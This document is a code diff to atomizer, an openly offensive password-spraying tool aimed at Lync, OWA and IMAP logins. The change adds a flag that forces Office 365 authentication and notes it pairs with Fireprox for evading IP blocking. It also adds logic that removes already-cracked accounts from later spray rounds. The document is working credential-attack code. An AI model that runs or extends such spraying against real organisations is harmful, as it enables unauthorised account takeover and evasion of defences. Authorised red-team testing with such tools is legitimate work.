@@ -2,11 +2,11 @@
 
 """
 Usage:
-    atomizer (lync|owa|imap) <target> <password> <userfile> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
-    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
-    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
-    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
-    atomizer (lync|owa|imap) <target> --recon [--debug] [--proxy PROXY] [--shuffle]
+    atomizer (lync|owa|imap) <target> <password> <userfile> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle] [--o365]
+    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle] [--o365]
+    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle] [--o365]
+    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle] [--o365]
+    atomizer (lync|owa|imap) <target> --recon [--debug] [--proxy PROXY]
     atomizer -h | --help
     atomizer -v | --version
 
@@ -28,6 +28,7 @@ Options:
     -x, --proxy PROXY        use proxy on requests
     --recon                  only collect info, don't password spray
     --shuffle                shuffle user list in each iteration
+    --o365                   force o365 auth method (useful with Fireprox)
     --gchat URL              gchat webhook url for notification
     --slack URL              slack webhook url for notification
     --user-row-name NAME     username row title in CSV file [default: Email Address]
@@ -52,7 +53,7 @@ from core.webhooks import gchat, slack
 
 
 class Atomizer:
-    def __init__(self, loop, target, threads=3, debug=False, proxy=None, shuffle=False, sleep=5):
+    def __init__(self, loop, target, threads=3, debug=False, proxy=None, shuffle=False, sleep=5, o365=False):
         self.loop = loop
         self.target = target
         self.sprayer = None
@@ -60,6 +61,7 @@ class Atomizer:
         self.debug = debug
         self.shuffle = shuffle
         self.sleep = int(sleep)
+        self.force_o365 = o365
         if proxy is None:
             self.proxy = None
         else:
@@ -88,7 +90,8 @@ class Atomizer:
     def owa(self):
         self.sprayer = OWA(
             target=self.target,
-            proxy=self.proxy
+            proxy=self.proxy,
+            force_o365=self.force_o365
         )
 
     def imap(self, port):
@@ -174,6 +177,7 @@ if __name__ == "__main__":
         proxy=args['--proxy'],
         shuffle=args['--shuffle'],
         sleep=args['--sleep'],
+        o365=args['--o365']
     )
 
     logging.debug(args)
@@ -201,6 +205,8 @@ if __name__ == "__main__":
                 while password != "":
                     with open(args['<userfile>']) as userfile:
                             userlist = userfile.read().splitlines()
+                            # remove valid accounts from list
+                            userlist = list(set(userlist) - set([u.split(':')[0] for u in atomizer.sprayer.valid_accounts]))
                             loop.run_until_complete(
                                 atomizer.atomize(
                                     userlist=userlist,
